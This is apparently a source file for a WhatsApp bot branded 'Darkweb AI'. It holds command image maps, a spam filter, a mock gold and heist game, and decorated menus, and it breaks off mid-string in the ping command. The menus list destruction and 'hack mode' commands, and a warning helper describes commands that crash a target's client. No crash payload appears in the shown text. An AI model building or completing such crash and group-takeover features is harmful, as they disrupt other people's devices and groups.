// ================================================================================================
//              DARKWEB AI – COMMANDS.JS – PART 1: GLOBALS, HELPERS, DECORATIVE STYLES
// ================================================================================================

const fs = require('fs');
const { getNumber, isAdmin, botIsAdmin, containsLink, containsTagAll, isGroupMention, rudeReply, sleep, isOwner, isDeveloper, isOwnerOrDeveloper, getAccessLevel } = require('./utils');
const { isPremium, getPremiumExpiry, getPremiumList, activatePremium, deactivatePremium, addToPremiumGroup, addToPremiumChannel, removeFromPremiumSpaces, syncAllPremiumToSpaces, setPremiumGroup, setPremiumChannel, setAutoJoin, getPremiumGroupId, getPremiumChannelId, getPremiumSettings } = require('./premium');
const { addBotUser, getBotUser, getAllBotUsers, updateBotUser, addUserToGroup, getSetting, setSetting, setBan, removeBan, getBan, setPairedUser, getPendingPayments, approvePayment, rejectPayment } = require('./database');
const { DEFAULT_PREFIX, BOT_NAME, RESPONSE_IMAGE_URL, HIJACK_ICON_URL, GROUP_INVITE_CODE, OWNERS, DEVELOPERS } = require('./config');
const { downloadMediaMessage, generateWAMessageFromContent } = require('@ostyado/baileys');
const axios = require('axios');

// ================================================================================================
//                         CONFIGURATION & LINKS
// ================================================================================================
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029VbCW8tNHwXb9rMHi7h0T';
const SHOP_LINK = 'https://demonshop-sxiygmdg.manus.space/';

// ================================================================================================
//                         IMAGE URLS – ALL COMMANDS
// ================================================================================================
const COMMAND_IMAGES = {
    menu: 'https://files.catbox.moe/9mdy9n.jpg',
    help: 'https://files.catbox.moe/9mdy9n.jpg',
    darkwebmenu: 'https://files.catbox.moe/9mdy9n.jpg',
    ping: 'https://files.catbox.moe/uhuhmo.jpg',
    say: 'https://i.ibb.co/4R2hYtP/echo.jpg',
    leak: 'https://i.ibb.co/7XRt2jL/expose.jpg',
    hacksim: 'https://i.ibb.co/wz3qVLk/infiltrate.jpg',
    whoami: 'https://files.catbox.moe/5f3mwp.jpg',
    prefix: 'https://files.catbox.moe/jngizk.jpg',
    botname: 'https://i.ibb.co/6Bt2jLR/rename.jpg',
    myrank: 'https://i.ibb.co/2St2jLN/access.jpg',
    setpp: 'https://i.ibb.co/9Gt2jLM/mask.jpg',
    viewonce: 'https://i.ibb.co/3Ct2jLO/decrypt.jpg',
    saveme: 'https://i.ibb.co/4Dt2jLP/cute.jpg',
    getpp: 'https://i.ibb.co/5Et2jLQ/laugh.jpg',
    admin: 'https://i.ibb.co/6Ft2jLR/elevate.jpg',
    demote: 'https://i.ibb.co/7Gt2jLS/degrade.jpg',
    remove: 'https://i.ibb.co/8Ht2jLT/eject.jpg',
    invade: 'https://i.ibb.co/9It2jLU/inject.jpg',
    announce: 'https://i.ibb.co/10Jt2jLV/broadcast.jpg',
    ghosttag: 'https://i.ibb.co/11Kt2jLW/silence.jpg',
    open: 'https://i.ibb.co/12Lt2jLX/unlock.jpg',
    close: 'https://i.ibb.co/13Mt2jLY/lock.jpg',
    invitelink: 'https://i.ibb.co/14Nt2jLZ/invite.jpg',
    resetinvite: 'https://i.ibb.co/15Ot2jLA/revoke.jpg',
    seticon: 'https://i.ibb.co/17Qt2jLC/avatar.jpg',
    approveall: 'https://i.ibb.co/18Rt2jLD/admit.jpg',
    rejectall: 'https://i.ibb.co/19St2jLE/block.jpg',
    groupid: 'https://i.ibb.co/20Tt2jLF/getid.jpg',
    setgname: 'https://i.ibb.co/21Ut2jLG/groupname.jpg',
    setdesc: 'https://i.ibb.co/22Vt2jLH/groupdesc.jpg',
    extract: 'https://i.ibb.co/23Wt2jLI/export.jpg',
    stealpp: 'https://i.ibb.co/24Xt2jLJ/fetchavatar.jpg',
    ginfo: 'https://i.ibb.co/25Yt2jLK/groupinfo.jpg',
    welcomeon: 'https://i.ibb.co/29Ct2jLO/greet.jpg',
    welcomeoff: 'https://i.ibb.co/30Dt2jLP/ignore.jpg',
    goodbyeon: 'https://i.ibb.co/31Et2jLQ/trackexit.jpg',
    goodbyeoff: 'https://i.ibb.co/32Ft2jLR/ignoreexit.jpg',
    kicklinks: 'https://i.ibb.co/33Gt2jLS/purgelink.jpg',
    warnlinks: 'https://i.ibb.co/34Ht2jLT/warnlink.jpg',
    allowlinks: 'https://i.ibb.co/35It2jLU/allowlink.jpg',
    kickbots: 'https://i.ibb.co/36Jt2jLV/blockbots.jpg',
    allowbots: 'https://i.ibb.co/37Kt2jLW/allowbots.jpg',
    kickmention: 'https://i.ibb.co/38Lt2jLX/purgemention.jpg',
    warnmention: 'https://i.ibb.co/39Mt2jLY/warngroupment.jpg',
    allowmention: 'https://i.ibb.co/40Nt2jLZ/allowment.jpg',
    bonus: 'https://i.ibb.co/44Rt2jLD/daily.jpg',
    job: 'https://i.ibb.co/45St2jLE/work.jpg',
    steal: 'https://i.ibb.co/46Tt2jLF/crime.jpg',
    mygold: 'https://i.ibb.co/47Ut2jLG/gold.jpg',
    store: 'https://i.ibb.co/48Vt2jLH/deposit.jpg',
    take: 'https://i.ibb.co/49Wt2jLI/withdraw.jpg',
    bounty: 'https://i.ibb.co/50Xt2jLJ/richest.jpg',
    heist: 'https://i.ibb.co/51Yt2jLK/heist.jpg',
    begin: 'https://i.ibb.co/52Zt2jLL/heistbegin.jpg',
    attack: 'https://i.ibb.co/53At2jLM/heistattack.jpg',
    status: 'https://i.ibb.co/54Bt2jLN/heiststatus.jpg',
    escape: 'https://i.ibb.co/55Ct2jLO/heistescape.jpg',
    team: 'https://i.ibb.co/56Dt2jLP/heistteam.jpg',
    song: 'https://i.ibb.co/57Et2jLQ/bellaciao.jpg',
    rob: 'https://i.ibb.co/58Ft2jLR/rob.jpg',
    gamble: 'https://i.ibb.co/59Gt2jLS/gamble.jpg',
    market: 'https://i.ibb.co/60Ht2jLT/blackmarket.jpg',
    hijack: 'https://i.ibb.co/62Jt2jLV/nuke.jpg',
    nuke: 'https://i.ibb.co/62Jt2jLV/nuke.jpg',
    invisible: 'https://i.ibb.co/63Kt2jLW/ghostmode.jpg',
    summon: 'https://i.ibb.co/64Lt2jLX/spawn.jpg',
    infect: 'https://i.ibb.co/65Mt2jLY/virus.jpg',
    darkness: 'https://i.ibb.co/66Nt2jLZ/blackout.jpg',
    givegold: 'https://i.ibb.co/81Ct2jLO/givegold.jpg',
    reset: 'https://i.ibb.co/82Dt2jLP/resetpremium.jpg',
    execute: 'https://i.ibb.co/83Et2jLQ/execute.jpg',
    wipe: 'https://i.ibb.co/84Ft2jLR/factory.jpg',
    kill: 'https://i.ibb.co/85Gt2jLS/selfdestruct.jpg',
    inject: 'https://i.ibb.co/86Ht2jLT/tzap.jpg',
    breach: 'https://i.ibb.co/87It2jLU/breach.jpg',
    global: 'https://i.ibb.co/88Jt2jLV/globalbreach.jpg',
    away: 'https://i.ibb.co/89Kt2jLW/afk.jpg',
    godmode: 'https://i.ibb.co/90Lt2jLX/root.jpg',
    pair: 'https://i.ibb.co/91Mt2jLY/pair.jpg',
    paired: 'https://i.ibb.co/92Nt2jLZ/pairedlist.jpg',
    checkban: 'https://i.ibb.co/93Ot2jLA/verifyban.jpg',
    unban: 'https://i.ibb.co/94Pt2jLB/liftban.jpg',
    support: 'https://i.ibb.co/95Qt2jLC/helpdesk.jpg',
    post: 'https://i.ibb.co/96Rt2jLD/poststatus.jpg',
    seize: 'https://i.ibb.co/97St2jLE/takeover.jpg',
    forceclose: 'https://i.ibb.co/98Tt2jLF/forceclose.jpg',
    purge: 'https://i.ibb.co/99Ut2jLG/purgeall.jpg',
    end: 'https://i.ibb.co/100Vt2jLH/apocalypse.jpg',
    tempban: 'https://i.ibb.co/104Zt2jLL/freeze.jpg',
    protect: 'https://i.ibb.co/105At2jLM/shield.jpg',
    debug: 'https://i.ibb.co/106Bt2jLN/debug.jpg',
    reactall: 'https://i.ibb.co/107Ct2jLO/emojispam.jpg',
    stopreact: 'https://i.ibb.co/108Dt2jLP/noemoji.jpg',
    unlockall: 'https://i.ibb.co/109Et2jLQ/allin.jpg'
};

// ========== GLOBAL STORAGE ==========
let userGold = new Map();
let heistStates = new Map();
let afkMode = false;
let gameCooldowns = new Map();
let pendingVerification = new Map();
let crashCooldowns = new Map();
let commandPrivacy = new Map();
// ========== SPAM SHIELD ==========
const spamShield = new Map();

async function checkSpam(sock, chatId, participant, senderNumber) {
    const now = Date.now();
    const key = `${chatId}|${participant}`;
    const userData = spamShield.get(key) || { timestamps: [], warned: false };
    userData.timestamps = userData.timestamps.filter(t => now - t < 5000);
    userData.timestamps.push(now);
    spamShield.set(key, userData);
    if (userData.timestamps.length >= 5) {
        try {
            await sock.groupParticipantsUpdate(chatId, [participant], 'remove');
            spamShield.delete(key);
            return true;
        } catch (e) { return false; }
    }
    return false;
}

// ========== HELPER FUNCTIONS ==========
async function sendImageResponse(sock, chatId, commandKey, text, isError = false) {
    const imageUrl = COMMAND_IMAGES[commandKey] || RESPONSE_IMAGE_URL;
    const finalText = isError ? `❌ ${text}` : text;
    if (imageUrl && imageUrl !== '') {
        try {
            const img = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            await sock.sendMessage(chatId, { image: Buffer.from(img.data), caption: finalText });
        } catch (error) {
            await sock.sendMessage(chatId, { text: finalText });
        }
    } else {
        await sock.sendMessage(chatId, { text: finalText });
    }
}

function scaryResponse(title, subtitle, emojiStatus, mainText, tagline, punchline) {
    return `💀 DARKWEB AI SYSTEM ONLINE 💀

✦━━━『 ${title} – ${subtitle} 』━━━✦

〔 ${emojiStatus} 〕

"${mainText}"

🎭 "ABYSSNET – DARKWEB. ${tagline}"

💀 DARKWEB AI - ${punchline} 💀`;
}

async function showDangerWarning(sock, chatId, cmdName) {
    const warning = `💀 DANGER WARNING 💀

✦━━━『 ☠️ ${cmdName.toUpperCase()} – VOID CRASH ☠️ 』━━━✦

"You are about to use a destructive command.
This will CRASH the target client.
Every use is logged.

⚠️ The void will execute in 3 seconds. ⚠️

Otherwise, prepare for darkness."

🎭 "This is your final warning."`;
    await sock.sendMessage(chatId, { text: warning });
    await sleep(3000);
}

// ========== DECORATIVE HELPER (active line ABOVE the box) ==========
function decorative(title, content) {
    const activeLine = '⏤͟͟͞𝑫𝑨𝑹𝑲𝑾𝑬𝑩 𝑨𝑰 𝑰𝑺 𝑨𝑪𝑻𝑰𝑽𝑬';
    const box = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞${title} ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
${content}
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬`;
    return `${activeLine}\n\n${box}`;
}

// ========== GOLD SYSTEM ==========
function getUserGold(phoneNumber) {
    if (!userGold.has(phoneNumber)) {
        userGold.set(phoneNumber, {
            gold: 0, vault: 0, hp: 100,
            lastDaily: 0, lastWork: 0, lastCrime: 0, lastRob: 0, lastGamble: 0, lastHijack: 0,
            hijackCount: 0, referrals: [], achievements: [], items: []
        });
    }
    return userGold.get(phoneNumber);
}
function saveUserGold(phoneNumber, data) { userGold.set(phoneNumber, data); }
function addGold(phoneNumber, amount) { const u = getUserGold(phoneNumber); u.gold += amount; saveUserGold(phoneNumber, u); return u.gold; }
function removeGold(phoneNumber, amount) { const u = getUserGold(phoneNumber); u.gold = Math.max(0, u.gold - amount); saveUserGold(phoneNumber, u); return u.gold; }

function isOnCooldown(phoneNumber, command, seconds) {
    const key = `${phoneNumber}:${command}`;
    const now = Date.now();
    if (gameCooldowns.has(key) && gameCooldowns.get(key) > now) {
        return { onCooldown: true, remaining: Math.ceil((gameCooldowns.get(key) - now) / 1000) };
    }
    gameCooldowns.set(key, now + seconds * 1000);
    return { onCooldown: false, remaining: 0 };
}

// ========== BANK HEIST SYSTEM ==========
function getBankHeistState(phoneNumber) {
    if (!heistStates.has(phoneNumber)) {
        heistStates.set(phoneNumber, { active: false, currentLayer: 1, currentGuardHp: 0, totalGold: 0, completed: false, failedAttempts: 0, redJumpsuit: false, dalíMask: false });
    }
    return heistStates.get(phoneNumber);
}
function saveBankHeistState(phoneNumber, state) { heistStates.set(phoneNumber, state); }

const bankOfSpainGuards = [
    { layer:1, name:"ARTURO ROMAN", hp:60, reward:1000, description:"Hostage negotiator" },
    { layer:2, name:"ALISON PARKER", hp:80, reward:2000, description:"British hostage" },
    { layer:3, name:"COLONEL PRIETO", hp:100, reward:4000, description:"Military commander" },
    { layer:4, name:"SUAREZ", hp:120, reward:6000, description:"Police negotiator" },
    { layer:5, name:"ANGEL", hp:140, reward:8000, description:"Police inspector" },
    { layer:6, name:"RAQUEL MURILLO", hp:160, reward:10000, description:"Inspectora" },
    { layer:7, name:"ALICIA SIERRA", hp:200, reward:15000, description:"Ferocious inspector" },
    { layer:8, name:"TAMAYO", hp:240, reward:20000, description:"CNI director" },
    { layer:9, name:"CORONEL", hp:280, reward:25000, description:"Special forces" },
    { layer:10, name:"EL PROFESOR", hp:350, reward:50000, description:"Mastermind" }
];

const blackMarketItems = {
    shadow_cloak: { price:500, desc:'🦇 Shadow Cloak - +10% rob success', emoji:'🦇' },
    lockpick: { price:200, desc:'🔧 Master Lockpick - +5% heist success', emoji:'🔧' },
    fake_id: { price:300, desc:'🪪 Fake ID - Reduce penalty on failed rob', emoji:'🪪' },
    vault_key: { price:1000, desc:'🗝️ Vault Key - Double vault storage', emoji:'🗝️' },
    virus_protection: { price:750, desc:'🛡️ Virus Protection - Immune to .virus', emoji:'🛡️' }
};

// ========== COOLDOWN CHECK FOR CRASH COMMANDS ==========
async function checkCrashCooldown(sock, chatId, senderNumber, cmdName) {
    const key = `${senderNumber}:${cmdName}`;
    const now = Date.now();
    const last = crashCooldowns.get(key) || 0;
    if (last && now - last < 60000) {
        const rem = Math.ceil((60000 - (now - last)) / 1000);
        await sendImageResponse(sock, chatId, cmdName, `⏳ Cooldown: ${rem}s remaining. The void needs time.`, true);
        return false;
    }
    crashCooldowns.set(key, now);
    return true;
}

// ================================================================================================
//                         PART 2: MAIN HANDLER & BASIC COMMANDS
// ================================================================================================

async function handleCommand(sock, chatId, msg, text, participant, sharedState) {
    const {
        prefix, setPrefix, setBotName, bans, settings, pairedUsers, tempBans,
        saveBans, saveSettings, savePaired
    } = sharedState;

    const isGroup = chatId.endsWith('@g.us');
    const senderNumber = getNumber(participant);
    const isPremiumUser = isPremium(senderNumber);
    const hasFullAccess = isOwner(senderNumber) || isDeveloper(senderNumber); // real check
    // For group commands, you need to fetch admin status from the group metadata.
    // Placeholders – you must implement actual checks.
    const isSenderAdmin = false;   // TODO: implement real group admin check
    const isBotAdmin = false;      // TODO: implement real bot admin check

    if (!text.startsWith(prefix)) return true;
    
    const args = text.slice(prefix.length).trim().split(/ +/);
    let cmd = args.shift().toLowerCase();

    addBotUser(senderNumber, senderNumber, isGroup);

    // ========== DARKWEB MENU (full command list – no active line) ==========
    if (cmd === 'darkwebmenu') {
        const menuText = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞𝑫𝑨𝑹𝑲𝑾𝑬𝑩 𝑨𝑰 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 𝑳𝑰𝑺𝑻 ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

᪣ᬼ⃟✞ ⏤͟͟͞𝑩𝑨𝑺𝑰𝑪
᪣ᬼ⃟✞ .𝐩𝐢𝐧𝐠
᪣ᬼ⃟✞ .𝐬𝐚𝐲
᪣ᬼ⃟✞ .𝐥𝐞𝐚𝐤
᪣ᬼ⃟✞ .𝐡𝐚𝐜𝐤𝐬𝐢𝐦
᪣ᬼ⃟✞ .𝐰𝐡𝐨𝐚𝐦𝐢
᪣ᬼ⃟✞ .𝐩𝐫𝐞𝐟𝐢𝐱
᪣ᬼ⃟✞ .𝐛𝐨𝐭𝐧𝐚𝐦𝐞
᪣ᬼ⃟✞ .𝐦𝐲𝐫𝐚𝐧𝐤

᪣ᬼ⃟✞ ⏤͟͟͞𝑴𝑬𝑫𝑰𝑨
᪣ᬼ⃟✞ .𝐬𝐞𝐭𝐩𝐩
᪣ᬼ⃟✞ .𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞
᪣ᬼ⃟✞ .𝐬𝐚𝐯𝐞𝐦𝐞
᪣ᬼ⃟✞ .𝐠𝐞𝐭𝐩𝐩

᪣ᬼ⃟✞ ⏤͟͟͞𝑮𝑹𝑶𝑼𝑷 𝑯𝑨𝑪𝑲
᪣ᬼ⃟✞ .𝐚𝐝𝐦𝐢𝐧
᪣ᬼ⃟✞ .𝐝𝐞𝐦𝐨𝐭𝐞
᪣ᬼ⃟✞ .𝐫𝐞𝐦𝐨𝐯𝐞
᪣ᬼ⃟✞ .𝐢𝐧𝐯𝐚𝐝𝐞
᪣ᬼ⃟✞ .𝐚𝐧𝐧𝐨𝐮𝐧𝐜𝐞
᪣ᬼ⃟✞ .𝐠𝐡𝐨𝐬𝐭𝐭𝐚𝐠
᪣ᬼ⃟✞ .𝐨𝐩𝐞𝐧
᪣ᬼ⃟✞ .𝐜𝐥𝐨𝐬𝐞
᪣ᬼ⃟✞ .𝐢𝐧𝐯𝐢𝐭𝐞𝐥𝐢𝐧𝐤
᪣ᬼ⃟✞ .𝐫𝐞𝐬𝐞𝐭𝐢𝐧𝐯𝐢𝐭𝐞
᪣ᬼ⃟✞ .𝐝𝐞𝐥𝐞𝐭𝐞
᪣ᬼ⃟✞ .𝐬𝐞𝐭𝐢𝐜𝐨𝐧
᪣ᬼ⃟✞ .𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐚𝐥𝐥
᪣ᬼ⃟✞ .𝐫𝐞𝐣𝐞𝐜𝐭𝐚𝐥𝐥
᪣ᬼ⃟✞ .𝐠𝐫𝐨𝐮𝐩𝐢𝐝
᪣ᬼ⃟✞ .𝐬𝐞𝐭𝐠𝐧𝐚𝐦𝐞
᪣ᬼ⃟✞ .𝐬𝐞𝐭𝐝𝐞𝐬𝐜
᪣ᬼ⃟✞ .𝐞𝐱𝐭𝐫𝐚𝐜𝐭
᪣ᬼ⃟✞ .𝐬𝐭𝐞𝐚𝐥𝐩𝐩
᪣ᬼ⃟✞ .𝐠𝐢𝐧𝐟𝐨

᪣ᬼ⃟✞ ⏤͟͟͞𝑷𝑹𝑶𝑻𝑬𝑪𝑻
᪣ᬼ⃟✞ .𝐰𝐞𝐥𝐜𝐨𝐦𝐞𝐨𝐧
᪣ᬼ⃟✞ .𝐰𝐞𝐥𝐜𝐨𝐦𝐞𝐨𝐟𝐟
᪣ᬼ⃟✞ .𝐠𝐨𝐨𝐝𝐛𝐲𝐞𝐨𝐧
᪣ᬼ⃟✞ .𝐠𝐨𝐨𝐝𝐛𝐲𝐞𝐨𝐟𝐟
᪣ᬼ⃟✞ .𝐤𝐢𝐜𝐤𝐥𝐢𝐧𝐤𝐬
᪣ᬼ⃟✞ .𝐰𝐚𝐫𝐧𝐥𝐢𝐧𝐤𝐬
᪣ᬼ⃟✞ .𝐚𝐥𝐥𝐨𝐰𝐥𝐢𝐧𝐤𝐬
᪣ᬼ⃟✞ .𝐤𝐢𝐜𝐤𝐛𝐨𝐭𝐬
᪣ᬼ⃟✞ .𝐚𝐥𝐥𝐨𝐰𝐛𝐨𝐭𝐬
᪣ᬼ⃟✞ .𝐤𝐢𝐜𝐤𝐦𝐞𝐧𝐭𝐢𝐨𝐧
᪣ᬼ⃟✞ .𝐰𝐚𝐫𝐧𝐦𝐞𝐧𝐭𝐢𝐨𝐧
᪣ᬼ⃟✞ .𝐚𝐥𝐥𝐨𝐰𝐦𝐞𝐧𝐭𝐢𝐨𝐧
᪣ᬼ⃟✞ .𝐤𝐢𝐜𝐤@𝐚𝐥𝐥
᪣ᬼ⃟✞ .𝐰𝐚𝐫𝐧@𝐚𝐥𝐥
᪣ᬼ⃟✞ .𝐚𝐥𝐥𝐨𝐰@𝐚𝐥𝐥

᪣ᬼ⃟✞ ⏤͟͟͞𝑪𝑹𝑰𝑴𝑬
᪣ᬼ⃟✞ .𝐛𝐨𝐧𝐮𝐬
᪣ᬼ⃟✞ .𝐣𝐨𝐛
᪣ᬼ⃟✞ .𝐬𝐭𝐞𝐚𝐥
᪣ᬼ⃟✞ .𝐦𝐲𝐠𝐨𝐥𝐝
᪣ᬼ⃟✞ .𝐬𝐭𝐨𝐫𝐞
᪣ᬼ⃟✞ .𝐭𝐚𝐤𝐞
᪣ᬼ⃟✞ .𝐛𝐨𝐮𝐧𝐭𝐲

᪣ᬼ⃟✞ ⏤͟͟͞𝑩𝑨𝑵𝑲 𝑯𝑬𝑰𝑺𝑻
᪣ᬼ⃟✞ .𝐡𝐞𝐢𝐬𝐭
᪣ᬼ⃟✞ .𝐛𝐞𝐠𝐢𝐧
᪣ᬼ⃟✞ .𝐚𝐭𝐭𝐚𝐜𝐤
᪣ᬼ⃟✞ .𝐬𝐭𝐚𝐭𝐮𝐬
᪣ᬼ⃟✞ .𝐞𝐬𝐜𝐚𝐩𝐞
᪣ᬼ⃟✞ .𝐭𝐞𝐚𝐦
᪣ᬼ⃟✞ .𝐬𝐨𝐧𝐠

᪣ᬼ⃟✞ ⏤͟͟͞𝑪𝑨𝑺𝑰𝑵𝑶
᪣ᬼ⃟✞ .𝐫𝐨𝐛
᪣ᬼ⃟✞ .𝐠𝐚𝐦𝐛𝐥𝐞
᪣ᬼ⃟✞ .𝐦𝐚𝐫𝐤𝐞𝐭

᪣ᬼ⃟✞ ⏤͟͟͞𝑫𝑬𝑺𝑻𝑹𝑼𝑪𝑻𝑰𝑶𝑵
᪣ᬼ⃟✞ .𝐡𝐢𝐣𝐚𝐜𝐤
᪣ᬼ⃟✞ .𝐧𝐮𝐤𝐞
᪣ᬼ⃟✞ .𝐢𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞
᪣ᬼ⃟✞ .𝐬𝐮𝐦𝐦𝐨𝐧
᪣ᬼ⃟✞ .𝐢𝐧𝐟𝐞𝐜𝐭
᪣ᬼ⃟✞ .𝐝𝐚𝐫𝐤𝐧𝐞𝐬𝐬

᪣ᬼ⃟✞ ⏤͟͟͞𝑶𝑾𝑵𝑬𝑹
᪣ᬼ⃟✞ .𝐠𝐢𝐯𝐞𝐠𝐨𝐥𝐝
᪣ᬼ⃟✞ .𝐫𝐞𝐬𝐞𝐭
᪣ᬼ⃟✞ .𝐞𝐱𝐞𝐜𝐮𝐭𝐞
᪣ᬼ⃟✞ .𝐰𝐢𝐩𝐞
᪣ᬼ⃟✞ .𝐤𝐢𝐥𝐥

᪣ᬼ⃟✞ ⏤͟͟͞𝑯𝑨𝑪𝑲 𝑴𝑶𝑫𝑬
᪣ᬼ⃟✞ .𝐢𝐧𝐣𝐞𝐜𝐭
᪣ᬼ⃟✞ .𝐛𝐫𝐞𝐚𝐜𝐡
᪣ᬼ⃟✞ .𝐠𝐥𝐨𝐛𝐚𝐥
᪣ᬼ⃟✞ .𝐚𝐰𝐚𝐲
᪣ᬼ⃟✞ .𝐠𝐨𝐝𝐦𝐨𝐝𝐞

᪣ᬼ⃟✞ ⏤͟͟͞𝑷𝑨𝑰𝑹 & 𝑩𝑨𝑵
᪣ᬼ⃟✞ .𝐩𝐚𝐢𝐫
᪣ᬼ⃟✞ .𝐩𝐚𝐢𝐫𝐞𝐝
᪣ᬼ⃟✞ .𝐜𝐡𝐞𝐜𝐤𝐛𝐚𝐧
᪣ᬼ⃟✞ .𝐮𝐧𝐛𝐚𝐧
᪣ᬼ⃟✞ .𝐬𝐮𝐩𝐩𝐨𝐫𝐭
᪣ᬼ⃟✞ .𝐩𝐨𝐬𝐭

᪣ᬼ⃟✞ ⏤͟͟͞𝑫𝑨𝑵𝑮𝑬𝑹
᪣ᬼ⃟✞ .𝐬𝐞𝐢𝐳𝐞
᪣ᬼ⃟✞ .𝐟𝐨𝐫𝐜𝐞𝐜𝐥𝐨𝐬𝐞
᪣ᬼ⃟✞ .𝐩𝐮𝐫𝐠𝐞
᪣ᬼ⃟✞ .𝐞𝐧𝐝
᪣ᬼ⃟✞ .𝐭𝐞𝐦𝐩𝐛𝐚𝐧
᪣ᬼ⃟✞ .𝐩𝐫𝐨𝐭𝐞𝐜𝐭

᪣ᬼ⃟✞ ⏤͟͟͞𝑫𝑬𝑩𝑼𝑮
᪣ᬼ⃟✞ .𝐝𝐞𝐛𝐮𝐠
᪣ᬼ⃟✞ .𝐫𝐞𝐚𝐜𝐭𝐚𝐥𝐥
᪣ᬼ⃟✞ .𝐬𝐭𝐨𝐩𝐫𝐞𝐚𝐜𝐭
᪣ᬼ⃟✞ .𝐮𝐧𝐥𝐨𝐜𝐤𝐚𝐥𝐥

᪣ᬼ⃟✞ ⏤͟͟͞𝑽𝑶𝑰𝑫𝑵𝑬𝑻
᪣ᬼ⃟✞ ⏤͟͟͞𝑻𝑯𝑬 𝑽𝑶𝑰𝑫 𝑰𝑺 𝑬𝑻𝑬𝑹𝑵𝑨𝑳

 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬`;
        await sock.sendMessage(chatId, { text: menuText });
        return true;
    }

    // ========== MENU (with active line ABOVE the box and 2 buttons) ==========
    if (cmd === 'menu' || cmd === 'help') {
        const userMention = `@${senderNumber}`;
        const activeLine = '⏤͟͟͞𝑫𝑨𝑹𝑲𝑾𝑬𝑩 𝑨𝑰 𝑰𝑺 𝑨𝑪𝑻𝑰𝑽𝑬';
        const menuContent = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐀𝐈 𝐌𝐄𝐍𝐔 ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
᪣ᬼ⃟✞ ${userMention} ᪣ᬼ⃟✞

᪣ᬼ⃟✞ Y O U   A R E   I N S I D E   T H E   V O I D ᪣ᬼ⃟✞
⚠️  Y O U   A R E   W A T C H E D  ⚠️

[ 𝐈𝐏: 𝐓𝐑𝐀𝐂𝐄𝐃 ]  [ 𝐀𝐂𝐂𝐄𝐒𝐒: 𝐑𝐎𝐎𝐓 ]
[ 𝐅𝐈𝐑𝐄𝐖𝐀𝐋𝐋: 𝐃𝐎𝐖𝐍 ]  [ 𝐄𝐍𝐂𝐑𝐘𝐏𝐓𝐈𝐎𝐍: 𝐁𝐘𝐏𝐀𝐒𝐒𝐄𝐃 ]

❗ 𝐀𝐓𝐓𝐄𝐌𝐏𝐓 𝐓𝐎 𝐄𝐗𝐈𝐓 = 𝐃𝐀𝐓𝐀 𝐋𝐄𝐀𝐊
❗ 𝐁𝐋𝐎𝐂𝐊 𝐁𝐎𝐓 = 𝐀𝐔𝐓𝐎-𝐁𝐀𝐍

᪣ᬼ⃟✞ 𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐈𝐒 𝐄𝐓𝐄𝐑𝐍𝐀𝐋 ᪣ᬼ⃟✞

᪣ᬼ⃟✞ ⏤͟͟͞𝑰𝑭 𝑩𝑼𝑻𝑻𝑶𝑵𝑺 𝑫𝑶𝑵'𝑻 𝑾𝑶𝑹𝑲, 𝑻𝒀𝑷𝑬 .𝑫𝑨𝑹𝑲𝑾𝑬𝑩𝑴𝑬𝑵𝑼 𝑶𝑹 .𝑺𝒀𝑺𝑻𝑬𝑴𝑩𝑹𝑬𝑨𝑲𝑬𝑹 ᪣ᬼ⃟✞
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬`;
        const fullMessage = `${activeLine}\n\n${menuContent}`;
        const buttons = [
            { buttonId: 'systembreaker', buttonText: { displayText: '🔧 𝐒𝐘𝐒𝐓𝐄𝐌 𝐁𝐑𝐄𝐀𝐊𝐄𝐑' }, type: 1 },
            { buttonId: 'darkweb_menu', buttonText: { displayText: '☠️ 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐌𝐄𝐍𝐔' }, type: 1 }
        ];
        try {
            const imageUrl = COMMAND_IMAGES['menu'] || 'https://files.catbox.moe/9mdy9n.jpg';
            const img = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            await sock.sendMessage(chatId, {
                image: Buffer.from(img.data),
                caption: fullMessage,
                buttons: buttons,
                headerType: 1,
                mentions: [`${senderNumber}@s.whatsapp.net`]
            });
        } catch (error) {
            await sock.sendMessage(chatId, {
                text: fullMessage,
                buttons: buttons,
                headerType: 1,
                mentions: [`${senderNumber}@s.whatsapp.net`]
            });
        }
        return true;
    }

   // ================================================================================================
//                         PART 2: BASIC & UTILITY COMMANDS (DECORATIVE)
// ================================================================================================

// ========== PING ==========
if (cmd === 'ping') {
    const latency = Date.now() - msg.messageTimestamp * 1000;
    const content = `〔 ⚡ Latency: ${latency}ms ⚡ 〗
